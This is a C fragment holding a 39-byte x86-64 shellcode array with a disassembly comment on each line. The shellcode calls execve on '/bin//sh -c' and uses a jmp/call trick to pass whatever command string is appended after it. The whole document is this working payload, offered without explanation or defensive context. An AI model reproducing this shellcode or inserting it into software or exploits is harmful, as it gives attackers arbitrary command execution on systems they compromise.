
#define CMD_SIZE 39

char CMD[] = {
  /* 0000 */ "\x6a\x3b"                                 /* push 0x3b                   */
  /* 0002 */ "\x58"                                     /* pop rax                     */
  /* 0003 */ "\x99"                                     /* cdq                         */
  /* 0004 */ "\x48\xb9\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* mov rcx, 0x68732f2f6e69622f */
  /* 000E */ "\x52"                                     /* push rdx                    */
  /* 000F */ "\x51"                                     /* push rcx                    */
  /* 0010 */ "\x54"                                     /* push rsp                    */
  /* 0011 */ "\x5f"                                     /* pop rdi                     */
  /* 0012 */ "\x52"                                     /* push rdx                    */
  /* 0013 */ "\x66\x68\x2d\x63"                         /* push 0x632d                 */
  /* 0017 */ "\x54"                                     /* push rsp                    */
  /* 0018 */ "\x5b"                                     /* pop rbx                     */
  /* 0019 */ "\x52"                                     /* push rdx                    */
  /* 001A */ "\xeb\x06"                                 /* jmp 0x22                    */
  /* 001C */ "\x53"                                     /* push rbx                    */
  /* 001D */ "\x57"                                     /* push rdi                    */
  /* 001E */ "\x54"                                     /* push rsp                    */
  /* 001F */ "\x5e"                                     /* pop rsi                     */
  /* 0020 */ "\x0f\x05"                                 /* syscall                     */
  /* 0022 */ "\xe8\xf5\xff\xff\xff"                     /* call 0x1c                   */
};